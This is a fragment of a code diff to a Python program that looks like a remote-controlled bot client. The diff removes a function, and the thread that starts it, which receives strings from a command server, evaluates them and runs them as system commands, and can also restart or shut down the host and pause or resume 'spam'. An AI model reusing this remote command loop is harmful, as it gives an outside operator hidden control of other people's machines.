@@ -268,30 +268,7 @@ def uptime_calculator():
     uptime += f"{int(minutes)}m {int(seconds)}s"
 
 
-def execute_commands():
-    global host_ip, continue_spam
-    execute_commands_connection = force_connect_server('tcp')
-    __send_to_connection(execute_commands_connection, b'11')
-    execute_commands_connection.settimeout(5)
-    while True:
-        try:
-            code = __receive_from_connection(execute_commands_connection)
-            code = eval(code)
-            if code == '':
-                pass
-            elif code == 'rs':
-                __restart_host_machine()
-            elif code == 'sd':
-                __shutdown_host_machine()
-            elif code == "spam_resume":
-                continue_spam = True
-            elif code == "spam_pause":
-                continue_spam = False
-            else:
-                system_caller(code)
-        except:
-            break
-    Thread(target=execute_commands).start()
+
 
 def send_data():
     global host_ip, continue_spam
@@ -325,7 +302,6 @@ genuine_ip = __receive_from_connection(test_connection).decode()
 start_time = time()
 Thread(target=restart_if_connection_missing).start()
 Thread(target=send_data).start()
-Thread(target=execute_commands).start()
 next_ip_reset = 0
 
 
